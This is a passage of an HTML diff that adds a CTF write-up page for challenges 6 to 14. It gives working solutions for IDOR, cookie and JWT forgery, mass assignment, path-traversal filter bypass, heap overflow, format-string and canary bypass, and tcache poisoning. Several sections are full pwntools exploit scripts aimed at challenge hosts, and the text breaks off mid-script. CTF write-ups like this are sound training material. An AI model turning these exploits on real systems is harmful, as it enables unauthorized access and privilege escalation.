+      The vulnerability stems from a lack of server-side authorization checks on the <strong><code>/api/user/&lt;id&gt;</code></strong> endpoint. By failing to verify if the requesting user owns the requested ID, the application allows unauthorized parties to leak sensitive internal data.
+    </div>
+    <p style="margin-top:14px;font-size:.9rem;color:var(--muted);">Proof of Concept Request:</p>
+    <div class="code-block">
+      <div class="code-lang">http</div>
+      <pre>GET http://chall-5e4bc8df.evt-246.glabs.ctf7.com/api/user/2</pre>
+    </div>
+  </div>
+
+  <div class="flag-box">
+    <div class="flag-icon">🚩</div>
+    <div>
+      <div class="flag-label">Flag</div>
+      <div class="flag-value">ctf7{org_internal_breach_0bb1047b}</div>
+    </div>
+  </div>
+</div>
+
+<div class="divider"></div>
+
+<!-- ─────────────── 7. Cookie Auth ─────────────── -->
+<div class="challenge" id="ch7">
+  <div class="challenge-header">
+    <span class="challenge-num web">07</span>
+    <div class="challenge-title-wrap">
+      <h2>Cookie Auth</h2>
+      <div class="tags">
+        <span class="tag web">Web</span>
+        <span class="tag web">Cookie Forgery</span>
+        <span class="tag web">MD5</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="summary-box">
+    The Staff Portal utilizes a custom cookie-based authentication mechanism. Sessions are managed via base64-encoded JSON objects containing a username, role, and a sig. The signature is computed using: <code>sig = MD5(secret + username + role)</code>
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 01</span>
+      <h3>Identifying the Secret</h3>
+    </div>
+    <p>A review of the <code>/login</code> page source reveals a hidden debug comment containing the authentication secret:</p>
+    <div class="code-block">
+      <div class="code-lang">html</div>
+      <pre>&lt;!-- debug: auth_secret=supersecretkey --&gt;</pre>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 02</span>
+      <h3>Analyzing the Cookie Structure</h3>
+    </div>
+    <p>According to the hint found at <code>/source</code>, the application expects the following JSON structure before base64 encoding:</p>
+    <div class="code-block">
+      <div class="code-lang">structure</div>
+      <pre>base64(json({"username": "...", "role": "...", "sig": "..."}))</pre>
+    </div>
+    <p>To impersonate an administrator, a valid signature for the admin role can be manually calculated using the leaked secret:</p>
+    <div class="code-block">
+      <div class="code-lang">formula</div>
+      <pre>sig = MD5(secret + username + role)</pre>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 03</span>
+      <h3>Forging the Admin Cookie</h3>
+    </div>
+    <p>The following Python script generates a valid administrative session cookie:</p>
+    <div class="code-block">
+      <div class="code-lang">python</div>
+      <pre>import hashlib, json, base64
+
+secret = "supersecretkey"
+username = role = "admin"
+sig = hashlib.md5((secret + username + role).encode()).hexdigest()
+cookie = {"username": username, "role": role, "sig": sig}
+print(base64.b64encode(json.dumps(cookie).encode()).decode())</pre>
+    </div>
+    <p>Resulting Payload:</p>
+    <div class="response-block">
+      <div class="code-lang">output</div>
+      <pre>eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJyb2xlIjogImFkbWluIiwgInNpZyI6ICIwZDhjMmU2Njg5ODcyNjkzMjY5YjEzYTM4ZjlhZDEyYiJ9</pre>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 04</span>
+      <h3>Retrieving the Flag</h3>
+    </div>
+    <p>Locate the authentication cookie in the browser's developer tools. Update the cookie value with the forged base64 string. Refresh the dashboard to access the admin panel and reveal the flag.</p>
+  </div>
+
+  <div class="flag-box">
+    <div class="flag-icon">🚩</div>
+    <div>
+      <div class="flag-label">Flag</div>
+      <div class="flag-value">ctf7{dont_eat_cookie_c59fedd9}</div>
+    </div>
+  </div>
+</div>
+
+<div class="divider"></div>
+
+<!-- ─────────────── 8. UserHub ─────────────── -->
+<div class="challenge" id="ch8">
+  <div class="challenge-header">
+    <span class="challenge-num web">08</span>
+    <div class="challenge-title-wrap">
+      <h2>UserHub</h2>
+      <div class="tags">
+        <span class="tag web">Web</span>
+        <span class="tag web">Mass Assignment</span>
+        <span class="tag web">API</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="summary-box">
+    UserHub is a user management platform that utilizes a REST API for profile modifications. The objective is to identify a logic vulnerability in the API that permits unauthorized administrative access to retrieve the hidden flag.
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 01</span>
+      <h3>Reconnaissance</h3>
+    </div>
+    <p>After registering an account, dashboard behavior was analyzed. Profile updates are handled via a PUT request to the <code>/api/profile</code> endpoint. The application transmits the following JSON structure:</p>
+    <div class="code-block">
+      <div class="code-lang">json</div>
+      <pre>{
+  "email": "<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="90f5e8f1fde0fcf5d0e3f9e4f5bef3fffd">[email&#160;protected]</a>",
+  "bio": "CTF player"
+}</pre>
+    </div>
+    <p>The application logic dictates that if a user's <code>role</code> attribute is set to <code>"admin"</code>, the restricted Admin Panel becomes accessible.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 02</span>
+      <h3>Hypothesis — Mass Assignment</h3>
+    </div>
+    <p>While the frontend interface only provides options to edit the email and bio, the backend may be vulnerable to mass assignment. The server-side logic may blindly map the input JSON to the user object, potentially allowing modification of internal attributes like <code>role</code>.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 03</span>
+      <h3>Exploit</h3>
+    </div>
+    <p>A PUT request to the API was manually crafted to inject the admin role. Using the browser console, the following fetch command was executed:</p>
+    <div class="code-block">
+      <div class="code-lang">javascript</div>
+      <pre>fetch('/api/profile', {
+  method: 'PUT',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({
+    email: "<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="73121d0a331007155d1f1c10121f">[email&#160;protected]</a>",
+    bio: "h4x0r",
+    role: "admin"
+  })
+}).then(res => res.json()).then(console.log);</pre>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 04</span>
+      <h3>Elevation of Privilege</h3>
+    </div>
+    <p>After refreshing the session, the dashboard rendered the "Access Admin Panel" button, confirming that the account role was successfully elevated.</p>
+  </div>
+
+  <div class="explanation">
+    The vulnerability is caused by the backend's failure to sanitize or filter the input fields in the PUT request body, leading to a mass assignment vulnerability. Because the server does not enforce a whitelist for editable properties, any user can update their privileges by simply including the <strong><code>"role": "admin"</code></strong> key-value pair in their profile update.
+  </div>
+
+  <div class="flag-box">
+    <div class="flag-icon">🚩</div>
+    <div>
+      <div class="flag-label">Flag</div>
+      <div class="flag-value">ctf7{guess_the_music_83230825}</div>
+    </div>
+  </div>
+</div>
+
+<div class="divider"></div>
+
+<!-- ─────────────── 9. DocViewer ─────────────── -->
+<div class="challenge" id="ch9">
+  <div class="challenge-header">
+    <span class="challenge-num web">09</span>
+    <div class="challenge-title-wrap">
+      <h2>DocViewer</h2>
+      <div class="tags">
+        <span class="tag web">Web</span>
+        <span class="tag web">Path Traversal</span>
+        <span class="tag web">Filter Bypass</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="summary-box">
+    The DocViewer application facilitates the retrieval of internal documentation via the <code>/view?file=</code> parameter. Although the developers claim to have implemented a robust security filter to prevent unauthorized access outside the documentation directory, a path traversal vulnerability is demonstrated below.
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 01</span>
+      <h3>Reconnaissance</h3>
+    </div>
+    <p>Analysis of the documentation links reveals that the application passes filenames directly through a URL parameter:</p>
+    <div class="code-block">
+      <div class="code-lang">url</div>
+      <pre>/view?file=api-reference.md</pre>
+    </div>
+    <p>To probe for directory traversal, several payloads were tested designed to escape the documentation root.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 02</span>
+      <h3>Exploitation</h3>
+    </div>
+    <p>A standard traversal attempt using <code>../../../../flag.txt</code> was unsuccessful. However, utilizing a double-nested sequence — <code>....//....//....//flag.txt</code> — effectively bypassed the security filter and disclosed the flag.</p>
+    <div class="explanation">
+      <strong>How the bypass works:</strong> The vulnerability stems from a naive sanitization filter that removes the <code>../</code> string in a single pass. By submitting <code>..//</code>, the internal <code>../</code> is stripped, leaving a valid traversal sequence behind. For instance:
+      <br/><br/>
+      <strong>Payload:</strong> <code>....//flag.txt</code><br/>
+      <strong>Sanitization removes <code>../</code>:</strong> <code>../flag.txt</code>
+      <br/><br/>
+      Repeated segments allow for deep directory traversal.
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 03</span>
+      <h3>Payload Construction</h3>
+    </div>
+    <div class="code-block">
+      <div class="code-lang">url</div>
+      <pre>http://chall-2895ff1f.evt-246.glabs.ctf7.com/view?file=....//....//....//flag.txt</pre>
+    </div>
+  </div>
+
+  <div class="flag-box">
+    <div class="flag-icon">🚩</div>
+    <div>
+      <div class="flag-label">Flag</div>
+      <div class="flag-value">ctf7{confidential_doc_leak_b899e649}</div>
+    </div>
+  </div>
+</div>
+
+<div class="divider"></div>
+
+<!-- ─────────────── 10. Cracked Seal ─────────────── -->
+<div class="challenge" id="ch10">
+  <div class="challenge-header">
+    <span class="challenge-num crypto">10</span>
+    <div class="challenge-title-wrap">
+      <h2>Cracked Seal</h2>
+      <div class="tags">
+        <span class="tag crypto">Crypto</span>
+        <span class="tag crypto">JWT</span>
+        <span class="tag crypto">pyjwt</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="summary-box">
+    The target admin portal utilizes JSON Web Tokens (JWTs) for authentication, signed using a vulnerable secret key. The objective is to manipulate the token payload to gain <code>role: admin</code> privileges and retrieve the flag.
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 01</span>
+      <h3>Identifying Endpoint and Token Behavior</h3>
+    </div>
+    <p>Analysis of the application reveals that the <code>/login</code> endpoint issues an <code>auth_token</code> cookie upon authentication. Regardless of the username provided, the JWT payload defaults to a guest role.</p>
+    <p>Example response header after POST:</p>
+    <div class="code-block">
+      <div class="code-lang">http</div>
+      <pre>Set-Cookie: auth_token=eyJhbGciOiJIUzI1NiIs...; Path=/</pre>
+    </div>
+    <p>Deconstructing the JWT reveals the following payload structure:</p>
+    <div class="code-block">
+      <div class="code-lang">json</div>
+      <pre>{"user":"admin","role":"guest","exp":...}</pre>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 02</span>
+      <h3>Authenticating to Retrieve JWT</h3>
+    </div>
+    <p>Any successful authentication attempt will yield a valid session token:</p>
+    <div class="code-block">
+      <div class="code-lang">bash</div>
+      <pre>curl -i -X POST 'http://138.199.174.108:5002/login' -d 'username=test'</pre>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 03</span>
+      <h3>Cracking the Signing Key</h3>
+    </div>
+    <p>A brute-force attack was initiated against the JWT signature using hashcat and the <code>rockyou.txt</code> wordlist to identify the secret key:</p>
+    <div class="code-block">
+      <div class="code-lang">bash</div>
+      <pre>echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiZ3Vlc3QiLCJleHAiOjE3NzQ4MDA1NTZ9.k5FSKAeZuGaVaG7lY7bwtnrvXdsVbYAE6rIdLf7Ev7o' > jwt.txt
+hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt</pre>
+    </div>
+    <p>Once the process is complete, the results will expose the cracked secret.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 04</span>
+      <h3>Forging an Administrative Token</h3>
+    </div>
+    <p>Using the discovered key and the <code>pyjwt</code> library, a script was developed to forge a token with elevated privileges:</p>
+    <div class="code-block">
+      <div class="code-lang">python</div>
+      <pre>import jwt, time
+
+secret = "secret_key_placeholder"
+payload = {"user": "admin", "role": "admin", "exp": int(time.time())+3600}
+print(jwt.encode(payload, secret, algorithm="HS256"))</pre>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 05</span>
+      <h3>Accessing the Admin Panel</h3>
+    </div>
+    <p>The forged JWT was injected into the <code>auth_token</code> cookie and the dashboard was requested:</p>
+    <div class="code-block">
+      <div class="code-lang">bash</div>
+      <pre>curl -i 'http://138.199.174.108:5002/' -H 'Cookie: auth_token=&lt;your_forged_admin_jwt_here&gt;'</pre>
+    </div>
+    <p>The server responded with the administrative message containing the flag:</p>
+    <div class="response-block">
+      <div class="code-lang">html — response</div>
+      <pre>&lt;div class="message"&gt;ctf7{jw7_w34k_s3cr37_cr4ck3d}&lt;/div&gt;</pre>
+    </div>
+  </div>
+
+  <div class="flag-box">
+    <div class="flag-icon">🚩</div>
+    <div>
+      <div class="flag-label">Flag</div>
+      <div class="flag-value">ctf7{jw7_w34k_s3cr37_cr4ck3d}</div>
+    </div>
+  </div>
+</div>
+
+<div class="divider"></div>
+
+<!-- ─────────────── 11. Header Hunter ─────────────── -->
+<div class="challenge" id="ch11">
+  <div class="challenge-header">
+    <span class="challenge-num misc">11</span>
+    <div class="challenge-title-wrap">
+      <h2>Header Hunter</h2>
+      <div class="tags">
+        <span class="tag misc">Misc</span>
+        <span class="tag misc">Content Negotiation</span>
+        <span class="tag misc">API</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="summary-box">
+    The documentation for the Gridware API provides a comprehensive overview of available resources. However, the <code>/api/v1/healthcheck</code> endpoint is explicitly categorized as "Internal." A critical hint indicates that this endpoint performs content negotiation, serving different data structures based on the <code>Accept</code> header.
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 01</span>
+      <h3>Discovering the Internal Endpoint</h3>
+    </div>
+    <p>The API documentation highlights a restricted route that adjusts its output format for machine-readability:</p>
+    <div class="code-block">
+      <div class="code-lang">http</div>
+      <pre>GET /api/v1/healthcheck [Internal]
+Accept: application/json (for machine-readable data)</pre>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 02</span>
+      <h3>Performing Content Negotiation</h3>
+    </div>
+    <p>By utilizing curl to manually set the <code>Accept</code> header to <code>application/json</code>, the internal data disclosure was triggered:</p>
+    <div class="code-block">
+      <div class="code-lang">bash</div>
+      <pre>curl -s -H "Accept: application/json" http://chall-ca0a1b85.evt-246.glabs.ctf7.com/api/v1/healthcheck</pre>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 03</span>
+      <h3>Analyzing the JSON Response</h3>
+    </div>
+    <p>The server returns a verbose status report containing environment details and a debug object:</p>
+    <div class="response-block">
+      <div class="code-lang">json — response</div>
+      <pre>{
+  "debug": {
+    "build": "4.2.0-rc3",
+    "internal_token": "ctf7{p4ck3t_1ns1ght_8db7a611}"
+  },
+  "status": "healthy"
+}</pre>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 04</span>
+      <h3>Extracting the Flag</h3>
+    </div>
+      <div class="step">
+    <div class="step-label">
+      <span class="step-num">STEP 04</span>
+      <h3>Extracting the Flag</h3>
+    </div>
+    <p>The flag is leaked within the <code>internal_token</code> field of the debug output.</p>
+  </div>
+
+  <div class="flag-box">
+    <div class="flag-icon">🚩</div>
+    <div>
+      <div class="flag-label">Flag</div>
+      <div class="flag-value">ctf7{p4ck3t_1ns1ght_8db7a611}</div>
+    </div>
+  </div>
+</div>
+
+<!-- CHALLENGES 12-19 -->
+
+<div class="divider"></div>
+
+<!-- 12. Dojo Scrolls -->
+<div class="challenge" id="ch12">
+  <div class="challenge-header">
+    <span class="challenge-num pwn">12</span>
+    <div class="challenge-title-wrap">
+      <h2>Dojo Scrolls</h2>
+      <div class="tags">
+        <span class="tag pwn">Pwn</span>
+        <span class="tag pwn">Heap Overflow</span>
+        <span class="tag pwn">Go Binary</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="summary-box">
+    A remote Go binary implements a simple note-taking app with 4 operations: create note, edit note, show note, and exit. Notes are allocated on the heap and the edit function does not reallocate when the new size exceeds the original — a classic heap buffer overflow. The challenge hint: "when a scroll outgrows its space, the ink bleeds onto the next."
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">RECON</span><h3>Identifying the Language &amp; Architecture</h3></div>
+    <p>Triggering a crash by showing or editing a non-existent note gives us a Go stack trace:</p>
+    <div class="code-block">
+      <div class="code-lang">output</div>
+      <pre>panic: runtime error: invalid memory address or nil pointer dereference
+[signal SIGSEGV: segmentation violation code=0x1 addr=0x4 pc=0x4868bd]
+
+goroutine 1 [running]:
+main.main()
+        /chall/main.go:117 +0x8fd</pre>
+    </div>
+    <p>Show crashes at <code>addr=0x4</code> (accessing a field at offset 4 of a nil pointer); Edit crashes at <code>addr=0x0</code> (offset 0). This tells us the internal Note struct is likely:</p>
+    <div class="code-block">
+      <div class="code-lang">go</div>
+      <pre>type Note struct {
+    Size int32          // offset 0x0
+    Data unsafe.Pointer // offset 0x4
+}</pre>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">ANALYSIS</span><h3>Understanding the Vulnerability</h3></div>
+    <div class="explanation">
+      The edit function accepts a new size and new data but does <strong>not reallocate</strong> the underlying buffer. If the new size exceeds the original allocation, the write overflows into adjacent heap memory — corrupting the neighboring note's metadata (its "seal").
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STRATEGY</span><h3>Exploitation Plan</h3></div>
+    <p>1. Create two notes in the same heap size class so their buffers are adjacent.<br/>
+       2. Edit <code>note[0]</code> with a size much larger than originally allocated.<br/>
+       3. The overflow corrupts <code>note[1]</code>'s metadata (the "seal").<br/>
+       4. Show <code>note[1]</code> — the program detects corruption and reveals the flag.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">EXPLOIT</span><h3>Exploit Script</h3></div>
+    <div class="code-block">
+      <div class="code-lang">python</div>
+      <pre>from pwn import *
+
+HOST = '138.199.174.108'
+PORT = 1337
+
+def create(io, idx, size, data):
+    io.sendlineafter(b'>', b'1')
+    io.sendlineafter(b':', str(idx).encode())
+    io.sendlineafter(b':', str(size).encode())
+    io.sendlineafter(b':', data)
+
+def edit(io, idx, size, data):
+    io.sendlineafter(b'>', b'2')
+    io.sendlineafter(b':', str(idx).encode())
+    io.sendlineafter(b':', str(size).encode())
+    io.sendlineafter(b':', data)
+
+def show(io, idx):
+    io.sendlineafter(b'>', b'3')
+    io.sendlineafter(b':', str(idx).encode())
+    return io.recvline()
+
+io = remote(HOST, PORT)
+io.recvuntil(b'4) Exit')
+
+# Step 1: Create two adjacent notes (same size class)
+create(io, 0, 24, b'A' * 8)
+create(io, 1, 24, b'B' * 8)
+
+# Step 2: Overflow note[0] into note[1]'s metadata
+edit(io, 0, 200, b'X' * 200)
+
+# Step 3: Show corrupted note → flag is revealed
+show(io, 1)  # Prints: ⚠️ Note is corrupted!
+
+io.interactive()  # Flag drops here</pre>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">EXECUTION</span><h3>Result</h3></div>
+    <div class="response-block">
+      <div class="code-lang">output</div>
+      <pre>$ python exploit.py
+[+] Opening connection to 138.199.174.108 on port 1337: Done
+[*] Switching to interactive mode
+ctf7{heap_c0rrupti0n_break5_bush1d0}</pre>
+    </div>
+  </div>
+
+  <div class="flag-box">
+    <div class="flag-icon">🚩</div>
+    <div>
+      <div class="flag-label">Flag</div>
+      <div class="flag-value">ctf7{heap_c0rrupti0n_break5_bush1d0}</div>
+    </div>
+  </div>
+</div>
+
+<div class="divider"></div>
+
+<!-- 13. Greeting Service -->
+<div class="challenge" id="ch13">
+  <div class="challenge-header">
+    <span class="challenge-num pwn">13</span>
+    <div class="challenge-title-wrap">
+      <h2>Greeting Service</h2>
+      <div class="tags">
+        <span class="tag pwn">Pwn</span>
+        <span class="tag pwn">Format String</span>
+        <span class="tag pwn">Stack Canary Bypass</span>
+        <span class="tag pwn">PIE Bypass</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="summary-box">
+    A binary that asks for a greeting format and a name. All modern mitigations are enabled: NX, Stack Canaries, PIE, and Full RELRO. A <code>secret_function</code> exists at offset <code>0x269</code> from the PIE base. The goal is to chain a format string info-leak with a buffer overflow to redirect execution there.
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">MITIGATIONS</span><h3>Security Protections in Place</h3></div>
+    <table class="info-table">
+      <tr><th>Mitigation</th><th>Status</th><th>Implication</th></tr>
+      <tr><td>NX</td><td>Enabled</td><td>Cannot run shellcode on the stack</td></tr>
+      <tr><td>Stack Canary</td><td>Enabled</td><td>Prevents standard buffer overflows</td></tr>
+      <tr><td>PIE</td><td>Enabled</td><td>Memory addresses randomize on every run</td></tr>
+      <tr><td>Full RELRO</td><td>Enabled</td><td>GOT is read-only; cannot hijack GOT entries</td></tr>
+    </table>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 01</span><h3>Vulnerability Discovery</h3></div>
+    <p>The program takes two consecutive inputs: a greeting format (reflected back), and a name (then exits). Feeding format specifiers like <code>%p %p %p</code> into the first prompt leaks raw hex values from the stack, confirming a <strong>Format String Vulnerability</strong>. Because the program then asks for a name and exits, this implies a secondary <strong>Buffer Overflow</strong> vulnerability.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 02</span><h3>Leaking the Canary and PIE Base</h3></div>
+    <p>Using direct parameter access with format specifiers, two critical stack positions were identified:</p>
+    <div class="code-block">
+      <div class="code-lang">format specifiers</div>
+      <pre>%9$p   → Stack Canary (identifiable by trailing 00 byte)
+%11$p  → Saved Return Address / RIP (used to bypass PIE)</pre>
+    </div>
+    <p>Since PIE randomizes the base but keeps page offsets static, the leaked return address always ended in <code>0x39c</code>. Subtracting this offset gives the PIE base:</p>
+    <div class="code-block">
+      <div class="code-lang">calculation</div>
+      <pre>pie_base       = leaked_rip - 0x39c
+secret_function = pie_base + 0x269</pre>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 03</span><h3>Bypassing the movaps Alignment Issue</h3></div>
+    <div class="explanation">
+      A standard ret2win payload caused an unexpected crash. Because the return address was hijacked via buffer overflow (bypassing the normal <code>call</code> instruction), the stack pointer (RSP) became misaligned by 8 bytes. When <code>secret_function</code> tried to call <code>system()</code>, it hit a <strong>movaps</strong> instruction, which requires strict 16-byte stack alignment.
+      <br/><br/>
+      <strong>The Fix:</strong> Adding <code>+1</code> to the target address forces the CPU to skip the <code>push rbp</code> instruction at the function's prologue — intentionally misaligning the stack by 8 bytes to perfectly cancel out our previous misalignment.
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 04</span><h3>Buffer Overflow &amp; Final Payload</h3></div>
+    <p>Through dynamic testing, the exact distance from the name input buffer to the stack canary is <strong>72 bytes</strong>. The final payload structure:</p>
+    <div class="code-block">
+      <div class="code-lang">payload layout</div>
+      <pre>[72 bytes of junk] + [leaked canary] + [8 bytes for RBP] + [secret_function + 1]</pre>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">EXPLOIT</span><h3>Full Exploit Script</h3></div>
+    <div class="code-block">
+      <div class="code-lang">python</div>
+      <pre>from pwn import *
+
+HOST = '212.2.250.33'
+PORT = 31379
+
+def exploit():
+    log.info("Initiating exploit against Greeting Service...")
+    p = remote(HOST, PORT)
+
+    # PHASE 1: Info Leak (Bypass Canary & PIE)
+    p.recvuntil(b"Greeting format:")
+    p.sendline(b"%9$p %10$p %11$p")
+    response = p.recvline().strip().split(b' ')
+
+    canary     = int(response[0], 16)
+    leaked_rip = int(response[2], 16)
+
+    log.success(f"Leaked Stack Canary: {hex(canary)}")
+
+    pie_base        = leaked_rip - 0x39c
+    secret_function = pie_base + 0x269
+
+    log.success(f"Calculated PIE Base:      {hex(pie_base)}")
+    log.success(f"Target secret_function:   {hex(secret_function)}")
+
+    # PHASE 2: Stack Smashing & Alignment Bypass
+    # +1 skips 'push rbp' to fix Ubuntu movaps alignment crash
+    target_address = secret_function + 1
+    OFFSET = 72  # buffer → canary distance
+
+    payload  = b"A" * OFFSET
+    payload += p64(canary)         # Cleanly rewrite the canary
+    payload += b"B" * 8            # Overwrite saved RBP with junk
+    payload += p64(target_address) # Overwrite RIP with aligned target
+
+    p.recvuntil(b"name:")
+    log.info("Sending malicious payload...")
+    p.sendline(payload)
+
+    p.sendline(b"cat flag.txt; cat flag")
+    p.interactive()
+
+exploit()</pre>
+    </div>
+  </div>
+
+  <div class="flag-box">
+    <div class="flag-icon">🚩</div>
+    <div>
+      <div class="flag-label">Flag</div>
+      <div class="flag-value">Obtained via interactive shell after exploit</div>
+    </div>
+  </div>
+</div>
+
+<div class="divider"></div>
+
+<!-- 14. Note Manager -->
+<div class="challenge" id="ch14">
+  <div class="challenge-header">
+    <span class="challenge-num pwn">14</span>
+    <div class="challenge-title-wrap">
+      <h2>Note Manager</h2>
+      <div class="tags">
+        <span class="tag pwn">Pwn</span>
+        <span class="tag pwn">Heap</span>
+        <span class="tag pwn">tcache Poisoning</span>
+        <span class="tag pwn">Off-by-One</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="summary-box">
+    A note-taking service supporting create, edit, delete, and print operations. The service helpfully prints heap, win(), and hook addresses on startup. There is a subtle off-by-one in the edit (append) operation — one byte too many lets us corrupt the tcache freelist pointer, enabling arbitrary write and code execution.
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 01</span><h3>Address Leaks from Banner</h3></div>
+    <p>On connection, the service prints three critical addresses that would normally require an info leak to obtain:</p>
+    <div class="code-block">
+      <div class="code-lang">output</div>
+      <pre>heap @ 0x...
+win()  @ 0x...
+hook   @ 0x...</pre>
+    </div>
+    <p>The client parses these with regex and stores them as <code>heap_addr</code>, <code>win_addr</code>, and <code>hook_addr</code>.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 02</span><h3>tcache Poisoning Strategy</h3></div>
+    <p>Three notes (n0, n1, n2) of equal size (<code>0x20</code>) are created so they occupy adjacent heap chunks. n2 and n1 are then freed in order, placing them on the tcache freelist in LIFO order (n1 on top). The off-by-one in edit lets us overwrite exactly one byte past the end of n0's buffer — which is the start of n1's freed chunk header, allowing corruption of the tcache next-pointer.</p>
+    <div class="code-block">
+      <div class="code-lang">python</div>
+      <pre>n0, _     = client.create(NOTE_LEN, b"A" * (NOTE_LEN - 1))
+n1, n1_addr = client.create(NOTE_LEN, b"B")
+n2, _     = client.create(NOTE_LEN, b"C")
+
+client.delete(n2)
+client.delete(n1)  # n1 now on top of tcache freelist</pre>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 03</span><h3>Poisoning the Freelist</h3></div>
+    <p>The <code>make_poison</code> function builds a payload that overwrites the tcache next-pointer of the freed n1 chunk with a safe-linked encoded pointer to <code>hook_addr</code>:</p>
+    <div class="code-block">
+      <div class="code-lang">python</div>
+      <pre>OVERWRITE_AT = 17  # byte offset where the next-ptr begins
+
+def make_poison(target: int, freed_chunk: int) -> bytes:
+    encoded_target = target ^ (freed_chunk >> 12)  # safe-link encoding
+    trailer = p64(encoded_target)
+    head = b"P" * OVERWRITE_AT
+    tail = b"Q" * (NOTE_LEN - OVERWRITE_AT - len(trailer))
+    return head + trailer + tail
+
+poison = make_poison(client.hook_addr, n1_addr)
+client.edit(n0, poison)  # off-by-one write corrupts n1's next-ptr</pre>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 04</span><h3>Arbitrary Write &amp; Flag</h3></div>
+    <p>Two more allocations drain the poisoned tcache. The second allocation lands at <code>hook_addr</code>, and its content is set to <code>win_addr</code> — writing the win function pointer into the hook. A final print_note triggers the hook and outputs the flag.</p>
+    <div class="code-block">
+      <div class="code-lang">python</div>
+      <pre>client.create(NOTE_LEN, b"D")                        # drains n1 slot
+_, landed = client.create(NOTE_LEN, p64(client.win_addr))  # lands at hook
+log.info("hook allocation landed at %#x", landed)
+
+output = client.print_note(0)  # triggers hook → flag printed</pre>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">FULL SCRIPT</span><h3>Complete Exploit</h3></div>
+    <div class="code-block">
+      <div class="code-lang">python</div>
+      <pre>import argparse, re, time
+from pwn import context, log, p64, remote
+
+FLAG_PATTERN = rb"ctf7\{[^}]+\}"
+HOST_DEFAULT = "212.2.250.33"
+PORT_DEFAULT = 30009
+NOTE_LEN     = 0x20
+OVERWRITE_AT = 17
+
+class NotesClient:
+    def __init__(self, host, port, attempts=10, pause=1):
+        self.io = self._connect_with_retry(host, port, attempts, pause)
+        banner = self.io.recvuntil(b"> ")
+        self.heap_addr = self._extract_addr(banner, rb"heap @ (0x[0-9a-fA-F]+)")
+        self.win_addr  = self._extract_addr(banner, rb"win\(\)  @ (0x[0-9a-fA-F]+)")
+        self.hook_addr = self._extract_addr(banner, rb"hook   @ (0x[0-9a-fA-F]+)")
+
+    @staticmethod
+    def _extract_addr(blob, pattern):
+        m = re.search(pattern, blob)
+        if not m: raise ValueError(f"missing address: {blob!r}")
+        return int(m.group(1), 16)
+
+    @staticmethod
+    def _connect_with_retry(host, port, attempts, pause):
+        last = None
+        for _ in range(attempts):
+            try: return remote(host, port)
+            except Exception as e: last = e; time.sleep(pause)
+        raise last
+
+    def _wait_prompt(self): return self.io.recvuntil(b"> ")
+
+    def create(self, size, content):
+        self.io.sendline(b"1"); self.io.recvuntil(b": ")
+        self.io.sendline(str(size).encode()); self.io.recvuntil(b"Content: ")
+        self.io.send(content + b"\n")
+        r = self._wait_prompt()
